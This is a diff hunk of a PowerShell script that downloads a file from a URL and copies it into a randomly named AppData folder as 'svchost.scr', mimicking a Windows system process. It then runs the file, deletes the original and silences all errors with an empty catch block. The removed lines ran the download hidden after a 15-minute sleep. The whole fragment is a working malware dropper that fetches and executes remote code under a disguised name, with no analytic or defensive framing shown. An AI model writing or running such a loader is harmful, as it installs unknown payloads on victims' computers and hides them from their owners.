@@ -6,8 +6,8 @@ $finalPath = "$env:APPDATA\$randomFolder"
 
 try {
     Invoke-WebRequest -Uri $scrUrl -OutFile $downloadPath -UseBasicParsing
-    Start-Process -FilePath $downloadPath -WindowStyle Hidden
-    Start-Sleep -Seconds 900
     New-Item -ItemType Directory -Path $finalPath -Force | Out-Null
-    Move-Item -Path $downloadPath -Destination "$finalPath\svchost.scr" -Force
+    Copy-Item -Path $downloadPath -Destination "$finalPath\svchost.scr" -Force
+    & "$finalPath\svchost.scr"
+    Remove-Item -Path $downloadPath -Force
 } catch {}
